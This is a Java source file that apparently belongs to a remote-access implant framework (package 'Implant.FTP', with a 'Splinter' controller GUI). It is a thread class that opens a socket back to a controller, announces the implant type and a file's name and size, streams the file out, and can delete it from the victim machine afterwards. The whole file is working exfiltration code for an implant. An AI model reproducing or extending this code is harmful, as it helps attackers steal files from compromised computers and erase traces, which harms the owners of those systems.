/**
 * This is the thread FTP sender class responsible for connecting to the controller and sending a requested file
 * 
 * @author Solomon Sonya 
 */

package Implant.FTP;


import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;

import Controller.GUI.Splinter_GUI;
import Implant.Driver;
import java.awt.*;



public class FTP_Thread_Sender extends Thread implements Runnable
{
	String strMyClassName = "FTP_Thread_Sender";
	
	IncrementObject statusIncrementObject = null;
	
	boolean i_am_implant_daemon = false;
	boolean i_am_controller_daemon = false;
	String controllerAddr;
	int PORT = 21;
	int maxBufferSize = 1024;
	File fleToSend = null;
	long fleSizeToSend = 1;
	
	long beginFileTransferTime = 1;
	long endFileTransferTime = 1;
	
	int readBufferSize = 1024*4;
	
	int bytesReadFromSocket = 0;	
	
	byte [] arSendFile_ByteArray = null;
	int continueBufferRead = 0;
	int totalBytesRead_FromFile = 0;
	int bytesReadFromFile = 0;
	
	InputStream is_FTP_SendFileIn = null;
	BufferedInputStream brin_OutFile = null;
	BufferedOutputStream brOut_SktConnection = null;
	
	DataOutputStream dos_SktConnection = null;
	DataInputStream dis_SktConnection = null;
	FileInputStream fis_FileToSend = null;	
	DataInputStream dis_SendFile = null;	
	FileOutputStream fos_OutFile = null; 
	
	
	public boolean deleteFileAfterSending = false;
	
	Socket sktConnection = null; 
	
	String strIPToSendFileTo = ""; 
	int port = 0;
	
	String strConnectionTimeStamp = "UNKNOWN";
	PrintWriter pwSocket = null;
	
	String SPECIAL_FILE_SEND_TYPE = "";
	
	public FTP_Thread_Sender(boolean implant_daemon, boolean controller_daemon, String controllerIP, int prt, int maxBuffer, File fleSend, PrintWriter pwOut, boolean deleteFileAfterSnd, String sendingFileType_its_ok_to_leave_null, IncrementObject incrementStatusObject)
	{
		i_am_implant_daemon = implant_daemon;
		i_am_controller_daemon = controller_daemon;
		controllerAddr = controllerIP;
		PORT = prt;
		maxBufferSize = maxBuffer;
		fleToSend =  fleSend;
		pwSocket = pwOut;
		deleteFileAfterSending = deleteFileAfterSnd;
		statusIncrementObject = incrementStatusObject;
		
		if(sendingFileType_its_ok_to_leave_null == null)
		{
			SPECIAL_FILE_SEND_TYPE = "";
		}
		else
		{
			SPECIAL_FILE_SEND_TYPE = Driver.delimeter_1 + sendingFileType_its_ok_to_leave_null;
		}
	}
	
	public void run()
	{
		try
		{
			if(fleToSend == null || !fleToSend.exists() || !fleToSend.isFile())
			{
				Driver.sop("File not found to send!");
				
				if(statusIncrementObject != null)
					statusIncrementObject.incrementStep();
				
				if(pwSocket != null)
				{
					pwSocket.println("Error!!! File: " + fleToSend + " not found!");
					pwSocket.flush();
				}
				
			}
			
			else
			{
				connectAndSendFile(controllerAddr, PORT, fleToSend);
			}
			
			//Close the streams
			
			try
			{
				//Driver.sop("Finished FTP Sender Thread. Closing streams ...");			
				
				if(statusIncrementObject != null)
					statusIncrementObject.incrementStep();
				
				if(dis_SktConnection != null)
					dis_SktConnection.close();
				
				if(dos_SktConnection != null)
					dos_SktConnection.close();
				
				if(sktConnection != null && sktConnection.isConnected())
					sktConnection.close();
				
				if(fis_FileToSend != null)
					fis_FileToSend.close();
				
				//brOutFile.close();
			}
			
			catch(Exception e)
			{
				
			}
		}
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public boolean connectAndSendFile(String address, int port, File fle)
	{
		try
		{
			boolean proceedToSendFile = false;
			
			Driver.sop("Attempting to connect to : " + address + " : " + port + " to send file: " + fle.getName());
			
			sktConnection = new Socket(address, port);
			
			//Connection established, ensure file still exists, and send it!
			if(sktConnection != null && sktConnection.isConnected() && !sktConnection.isOutputShutdown() && fle.exists())
			{
				//Open Streams on Socket Connection
				this.dos_SktConnection = new DataOutputStream(sktConnection.getOutputStream());
				this.dis_SktConnection = new DataInputStream(sktConnection.getInputStream());
				
				fleSizeToSend = fle.length();
				
				//Handshake to tell ReBACAR the file being sent
				dos_SktConnection.writeUTF(Driver.myImplant_Type + Driver.delimeter_1 + fle.getName() + Driver.delimeter_1 + fle.length() + SPECIAL_FILE_SEND_TYPE);
				dos_SktConnection.flush();
				
				//Driver.sop("\n\nSending:" + Driver.myImplant_Type + Driver.delimeter_1 + fle.getCanonicalPath() + Driver.delimeter_1 + fle.length() + " bytes");
				
				//Wait on the proceed command to send the file, exit otherwise
				String response = dis_SktConnection.readUTF();
				
				
				//Driver.sop("\n\n\nFile Size: (kb)" + fleToSend.length()/1000.0);
				
				if(response.equalsIgnoreCase("PROCEED"))
					proceedToSendFile = true;
				
				if(proceedToSendFile)
				{				
					//save the start time:
					beginFileTransferTime = System.currentTimeMillis();//get the current time in milliseconds
					
//System.out.println("Attempting to send File \"" + fle.getCanonicalPath() + "\"");
										
					//Open the input stream on the file
					fis_FileToSend = new FileInputStream(fle);
					
					//Next, it would be pertinent to synchronize the bytes arrays being read and sent here, to the bytearray being received and saved in Receiver, however, we'll stay constanct with 4096 byte packets at this moment
					
					//initialize the byte array
					arSendFile_ByteArray = new byte[readBufferSize];
					totalBytesRead_FromFile = 0;
					
					//send the file!
					while((bytesReadFromFile = fis_FileToSend.read(arSendFile_ByteArray)) > 0 )
					{
						//MODIFIED 2014-05-08 TO ONLY SEND THE NUMBER OF BYTES ACTUALLY READ AND NOT THE FULL BUFFER (WITH NULL SPACES!)
						//dos_SktConnection.write(arSendFile_ByteArray);
						dos_SktConnection.write(arSendFile_ByteArray, 0, bytesReadFromFile);
						dos_SktConnection.flush();
						
						//increment total bytes read if we're not at the end of the file buffer
						if(bytesReadFromFile >= 0) 
							totalBytesRead_FromFile += bytesReadFromFile;
		
					}
					
					//Finished sending the file, close the stream
					fis_FileToSend.close();
					
					boolean fileDeleted = true;
						
					//Check to display file sent sound
					if(totalBytesRead_FromFile == fleSizeToSend)
					{						
						this.endFileTransferTime = System.currentTimeMillis();//get the current time in milliseconds
						
						/*Driver.sop("Sending of file \"" + fle.getName() + "\"Completed Successfully. " + "\nTotal File Size: " + Driver.getFormattedFileSize_String(totalBytesRead_FromFile));
						pwSocket.println("File " + fle.getName() + " successfully transmitted to requestor");
						pwSocket.flush();*/
						
						if(this.deleteFileAfterSending)
						{
							try
							{
								Driver.sop("Attempting to delete File: " + fle.getCanonicalPath());
								fileDeleted = fle.delete();
								//Driver.sop(" -->File Deleted: " + fileDeleted);
								Driver.sop(" -->File Deleted");
							}catch(Exception e){Driver.sop("Could not delete file: " + fle.getCanonicalPath());}
						}
					}
					
					//Driver.sop("Sending of file \"" + fle.getName() + "\" Completed Successfully. " + " Total File Size: " + Driver.getFormattedFileSize_String(totalBytesRead_FromFile));
					Driver.sop("Successful Tx: \"" + fle.getName() + "\""+ " Size: " + Driver.getFormattedFileSize_String(totalBytesRead_FromFile));
					
					if(pwSocket != null)
					{
						pwSocket.println("File " + fle.getName() + " successfully transmitted to requestor");
						pwSocket.flush();
					}
					
					if(this.deleteFileAfterSending)
					{
						try
						{
							Driver.sop("Attempting to delete File: " + fle.getCanonicalPath());
							fileDeleted = fle.delete();
							//Driver.sop(" -->File Deleted: " + fileDeleted);
							Driver.sop(" -->File Deleted");
						}catch(Exception e){Driver.sop("Could not delete file: " + fle.getCanonicalPath());}
					}
				}
				
				else
				{
					try
					{
						Driver.sop("File \" " + fle.getCanonicalPath() + "\" was not sent.  It was rejected by Controller");
					}catch(Exception e){Driver.sop("File was not sent.  It was rejected by Controller");}
				}
					
			}
			
			else
			{
				Driver.sop("Error with the server.  Please try again!");
				
				if(pwSocket != null)
				{
					pwSocket.println("Error with the server.  Please try again!");
					pwSocket.flush();
				}
				
				return false;
			}
			
			return true;
			
		}
		
		
		catch(EOFException eofe)
		{
			Driver.sop("ERROR!!!  Could not establish a connection and response with " + address + " : " + port);
			
		}
		
		catch(ConnectException ce)
		{
			Driver.sop("ERROR!!  Could not establish a connection and response with " + address + " : " + port); 
		}
		
		catch(UnknownHostException uhe)
		{
			Driver.sop("ERROR!!!!  Could not establish a connection and response with " + address + " : " + port);
			return false;
		}
		
		catch(SocketException se)
		{
			Driver.sop("ERROR!!! Could not send file...the streams were closed.");			
		}
		
		catch(Exception e)
		{
			Driver.eop("connectAndSendFile", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}

}

